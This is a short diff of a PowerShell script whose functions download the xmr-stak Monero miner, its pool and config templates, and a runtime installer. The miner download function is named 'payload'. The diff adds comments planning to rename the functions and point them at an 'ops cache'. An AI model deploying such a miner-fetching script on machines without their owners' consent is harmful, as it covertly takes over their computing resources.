@@ -11,14 +11,14 @@ param(
 
 # Advance Party functions
 
-function redist ($destination) {
+function redist ($destination) { #change to point at ops cache and rename function
 
 	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 	Invoke-WebRequest -Uri https://aka.ms/vs/15/release/vc_redist.x64.exe -OutFile $destination
 
 }
 
-function payload ($destination) {
+function payload ($destination) { #change to point at ops cache and rename function
 
   # Get xmr-stak from github.
 
@@ -27,7 +27,7 @@ function payload ($destination) {
 
 }
 
-function configTpl () {
+function configTpl () { #change to point at ops cache and rename function
 
   # Get config template from github
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -35,7 +35,7 @@ function configTpl () {
 
 }
 
-function poolTpl () {
+function poolTpl () { #change to point at ops cache and rename function
 
   # Get pool template from github
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
